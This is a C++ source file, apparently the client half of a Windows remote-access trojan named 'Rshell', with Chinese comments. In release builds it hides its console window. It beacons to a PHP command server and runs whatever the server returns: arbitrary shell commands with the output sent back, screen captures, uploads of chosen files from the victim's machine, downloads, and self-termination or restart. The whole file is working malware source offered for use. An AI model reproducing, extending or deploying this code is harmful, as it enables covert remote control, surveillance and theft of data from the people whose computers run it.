// winSlave.cpp : 定义控制台应用程序的入口点。
//
#include "stdafx.h"

#include "base64.h"  
#include "sendReq.h"
#include "getFile.h"
#include "screenCap.h"

/**
*
*所有头文件信息：
*
*base64.cpp/h		base64编码
*string base64Encode(unsigned char const* bytes_to_encode, unsigned int in_len)+"\n";
*注：鉴于Java的base64自带\n结尾，这里必须添加以保持一致
*string base64Decode(std::string const& s);
*
*sendReq.h			数据传输(包括心跳请求命令，命令结果返回，文件/截图上传(先进行base64)),获取内网IP
*CString sendR(const TCHAR * lpHostName, const TCHAR * lpUrl, std::string postData);
*string localIP();
*
*getFile.cpp/h		文件下载
*bool getF(string command);
*
*screenCap.cpp/h	截屏,返回大小和数据指针(struct bmpMemData),记得截图完delete[]
*bmpMemData scrCap();
*
*
*
*特殊指令实现:
*
*slv-scrcap			截屏
*
*slv-up-[PATH]		受控端上传文件
*
*slv-dwn-[PATH]		受控端下载文件
*
*slv-killself		程序停止
*
*slv-restart		程序重启
*
**/

#define RSHELL_NULL "0";

//特殊指令实现
const struct COMMANDLIST {
	const std::string screenCapture		=		"slv-scrcap";
	const std::string uploadFile		=		"slv-up-";
	const std::string downloadFile		=		"slv-dwn-";
	const std::string programTerminate	=		"slv-killself";
	const std::string restartProgram	=		"slv-restart";
}COMMANDS;


//服务器配置
#ifdef _DEBUG
std::string URLMAIN = "192.168.0.100";
#elif NDEBUG
std::string URLMAIN = "192.168.0.100";
#endif
std::string URLAPI = "/Rshell/slave_client.php";

//服务器需要的身份验证
const std::string accessName = "RyuBAI";
const std::string encodeName = base64Encode(reinterpret_cast<const unsigned char*>(accessName.c_str()), accessName.length()) + "\n";

//心跳频率(ms)
const int awaitFreq = 15000;	//服务器没有返回值（无连接）
const int activeFreq = 1000;	//服务器有返回值

//获取本机内网IP
const std::string localIPAddr = localIP().c_str();



//心跳包等待控制命令时的POST参数
std::string GETCMDparams = "type=WAITSIG&lip=" + localIPAddr + "&access=" + encodeName + "&data=" + RSHELL_NULL;

//返回命令结果的POST参数
std::string SNDRESULTparams = "type=PUSHBAK&lip=" + localIPAddr + "&access=" + encodeName + "&data=";
std::string SNDRESULTparamsCmd = "&cmdline=";

//文件传输的POST参数
std::string SNDFILEparams = "type=SNDFILE&lip=" + localIPAddr + "&access=" + encodeName +"&data=\r\n--aabbccRSHELLSNDFILEDATASTART--\r\n";
std::string SNDFILEparamsFILENAMEEND = "\r\n--ddeeffRSHELLSNDFILENAMEEND--\r\n";
std::string SNDFILEparamEND = "\r\n--xxyyzzRSHELLSNDFILEDATAEND--\r\n";

//DEBUG功能测试函数
#ifdef _DEBUG
void debugTest();
#endif

//
std::string DATAS;

int main(int argc,char* argv[])
{
#ifdef _DEBUG
	std::cout << "DebugMode ON :)" << std::endl;
	long int beatCal = 0;
	debugTest();
#elif NDEBUG
	ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif 

	//心跳间隔
	int freq = 0;
	

	//进入处理循环
	for (;;) {


		//心跳间休眠
		Sleep(freq);

#ifdef _DEBUG
		std::cout << "HEARTBEAT num:"<< beatCal++ <<std::endl;
#endif  


		//心跳数据请求
		DATAS = sendR(URLMAIN,URLAPI,GETCMDparams);
		//砍掉数据结尾的\r\n
		if(DATAS.length()>2)DATAS = DATAS.substr(0, DATAS.length() - 2);

		//服务器有连接，心跳加快，没有连接减慢并continue跳过接下来的处理语句
		if (DATAS != "")freq = activeFreq;
		else { freq = awaitFreq; continue; }


		/**处理指令部分**/

		if (DATAS == COMMANDS.programTerminate)	break;
		else if (DATAS == COMMANDS.restartProgram)	{ _popen(argv[0], "r");break;}

		else if (DATAS == COMMANDS.screenCapture) {

			//截图数据流保留在内存中
			bmpMemData scr = scrCap();

			//时间做文件名 
			std::stringstream stream;
			stream << time(0);
			std::string scrFileName = stream.str();   //此处也可以用 stream>>string_temp  
			
			//byte是unsigned char,char是signed char，所以不转换直接连接到string会报错的
			std::string sndResult = sendR(URLMAIN, URLAPI, SNDFILEparams +  scrFileName+"_screenshot.bmp"  +SNDFILEparamsFILENAMEEND+ base64Encode(scr.bmpData, scr.length) + SNDFILEparamEND);

#ifdef _DEBUG
			std::cout << "\nCMDLINE: " << DATAS << std::endl;
			std::cout << sndResult << std::endl;
#endif

			//别忘了！！
			delete[] scr.bmpData;

		}
		else if (DATAS.find(COMMANDS.downloadFile)!=-1) {
		
			//数据类型转换
			std::string dwnLoc = DATAS;
			std::string l = COMMANDS.downloadFile;

			bool dwnResult = getF(dwnLoc, l);

#ifdef _DEBUG
			std::cout << "\nCMDLINE: " << dwnLoc << std::endl;
			if (dwnResult == true)std::cout << " download success!" << std::endl;
			else std::cout << " download failed!" << std::endl;
#endif

		
		}
		else if (DATAS.find(COMMANDS.uploadFile) != -1) {

			//数据类型转换
			std::string upLoc = DATAS;
			std::string l = COMMANDS.uploadFile;

			string_replace(upLoc, l, "");

			//读取文件内容到char* fileTmp

			FILE *pFile = fopen(upLoc.c_str(), "rb"); //获取文件的指针
			char *pBuf;	//定义文件指针
			fseek(pFile, 0, SEEK_END); //把指针移动到文件的结尾 ，获取文件长度
			int len = ftell(pFile); //获取文件长度
			pBuf = new char[len + 1]; //定义数组长度
			rewind(pFile); //把指针移动到文件开头 因为我们一开始把指针移动到结尾，如果不移动回来 会出错
			fread(pBuf, 1, len, pFile); //读文件
			pBuf[len] = 0; //把读到的文件最后一位 写为0 要不然系统会一直寻找到0后才结束
			fclose(pFile); // 关闭文件

			//识别文件名到std::string fileName
			std::string fileName = upLoc;
			int posi = upLoc.find_last_of("\\");
			fileName = upLoc.substr(posi + 1, upLoc.length());

			std::string sndResult = sendR(URLMAIN, URLAPI, SNDFILEparams + fileName +SNDFILEparamsFILENAMEEND+ base64Encode((unsigned char*)pBuf, sizeof(char) * len) + SNDFILEparamEND);
#ifdef _DEBUG
			std::cout << "\nCMDLINE: " << DATAS << std::endl;
			std::cout << "fileName: " << fileName << std::endl;
			std::cout << sndResult << std::endl;
#endif
			delete[] pBuf;

		}
		else {
			//cmd命令

			std::string shellExec = DATAS;

			FILE *pf = _popen(shellExec.c_str(), "r");

			std::string result;
			char tmp;
			while (fread(&tmp, 1, 1, pf), !feof(pf)) {
				result = result + tmp;

			}
			fclose(pf);

			//发送返回值
			std::string sndResult = sendR(URLMAIN, URLAPI, SNDRESULTparams + result + SNDRESULTparamsCmd + shellExec);

#ifdef _DEBUG
			std::cout << "\nCMDLINE: " << DATAS << std::endl;
			std::cout << sndResult << std::endl;
#endif
		}

		
		
		
	}






#ifdef _DEBUG
	std::cout << "\n\nProgram is going to terminate..." << std::endl;
	system("pause");
#endif


    return 0;
}


#ifdef _DEBUG
void debugTest() {
	std::cout << "\nTesting..." << std::endl;
	std::cout << "URLMAIN:"<< URLMAIN << std::endl;
	std::cout << "URLAPI:" << URLAPI <<std::endl << std::endl;
	std::cout << "accessName:" << accessName << std::endl;
	std::cout << "encodeName:" << encodeName << std::endl;
	std::cout << "Local IP Addr:" << localIPAddr << std::endl << std::endl;
	std::cout << "GETCMDparams:" << GETCMDparams<< std::endl;
	std::cout << "SNDRESULTparams:" << SNDRESULTparams << std::endl;


	std::string base64Test = "base64";
	std::cout << "\nTesting base64 with '"<< base64Test <<"'..." << std::endl;
	base64Test = base64Encode(reinterpret_cast<const unsigned char*>(base64Test.c_str()), base64Test.length());
	std::cout << "encode:"<<base64Test << std::endl;
	base64Test = vecCharToChar(base64Decode(base64Test.c_str()));
	std::cout << "decode:"<<base64Test << std::endl << std::endl;

	
	std::cout << "Testing screen capture..." << std::endl;
	bmpMemData scr_tmp = scrCap();
	FILE *scrtmp = fopen("scr.bmp", "w+b");
	fwrite(scr_tmp.bmpData, 1, scr_tmp.length, scrtmp);
	fclose(scrtmp);
	std::cout << "Capture saved in scr.bmp" << std::endl << std::endl;

	std::cout << "Testing download baidu.com/index.html ..." << std::endl;
	std::string lstr = COMMANDS.downloadFile;
	bool dwnResult = getF("slv-dwn-https://www.baidu.com/index.html",lstr);
	if (dwnResult == true)std::cout << "Download success!" << std::endl << std::endl;
	else std::cout << "Download failed!" << std::endl << std::endl;

	std::cout << "Testing upload scr.bmp(Success only if screen capture success) ..." << std::endl;
	std::string sndResult = sendR(URLMAIN, URLAPI, SNDFILEparams + "scr.bmp" +SNDFILEparamsFILENAMEEND+ base64Encode(scr_tmp.bmpData, scr_tmp.length) + SNDFILEparamEND);
	std::cout << "Upload finish!Please check out on Wireshark!" << std::endl;

	std::cout << "Testing base64 encode scr.bmp and save in scr_b64encode.bmp ..." << std::endl;
	std::fstream b64File("scr_b64encode.bmp", std::fstream::out);
	b64File << base64Encode(scr_tmp.bmpData, scr_tmp.length);
	b64File.close();
	std::cout << "Encode finish!Please check out scr_b64encode.bmp" << std::endl;

	std::cout << "Testing cmdline 'dir' ..." << std::endl;
	FILE *pf = _popen("dir", "r");
	std::string result;
	char tmp;
	while (fread(&tmp, 1, 1, pf), !feof(pf)) {
		result = result + tmp;

	}
	std::cout << "Outline:\n" << result << std::endl;
	std::cout << "Cmdline test finish!" << std::endl;


	delete[] scr_tmp.bmpData;//别忘了！！
	std::cout << "\n\nTest complete!Entering HEARTBEAT loop... \n\n" << std::endl;
}
#endif

